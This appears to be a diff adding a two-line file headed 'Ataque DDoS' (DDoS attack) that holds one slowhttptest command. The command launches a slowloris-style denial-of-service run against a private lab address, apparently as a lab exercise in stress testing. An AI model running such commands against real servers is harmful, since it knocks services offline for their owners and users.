@@ -1,0 +1,2 @@
+# Ataque DDoS
+sudo slowhttptest -c 1000 -H -g -o slowloris_test -i 10 -r 200 -t GET -u http://192.168.122.27 -x 24 -p 3
